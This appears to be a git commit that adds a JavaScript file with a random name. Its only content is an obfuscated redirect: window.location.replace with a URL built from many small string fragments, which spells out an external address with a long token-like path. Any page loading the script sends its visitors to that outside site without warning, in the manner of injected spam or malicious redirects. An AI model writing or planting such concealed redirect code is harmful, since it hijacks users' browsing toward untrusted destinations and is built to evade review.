0d5a7cd81d1b16bd9d9b15df5fc0e21cd84194d9
Parabeauty <113865732+Parabeauty@users.noreply.github.com>
2022-11-28 14:56:56 +0100

    Create aakhfdskdjgckjsgckhsegfhkcfsf.js

---
+++ aakhfdskdjgckjsgckhsegfhkcfsf.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/w`,`ww.ro`,`adswo`,`rks.co`,`m/gQ_h`,`BEIKQRf`,`ugBl4Sr-C`,`7HBf7oOc`,`glUXT-BMI`,`c-qXWxBur`,`qV1kY1M8Co`,`81112-`,`ycBiu4`,`8m_hfB`,`f5kiR_h`,`dBo2g~~/TA`,`HA/KESbGp1Wic`,`YAS`))
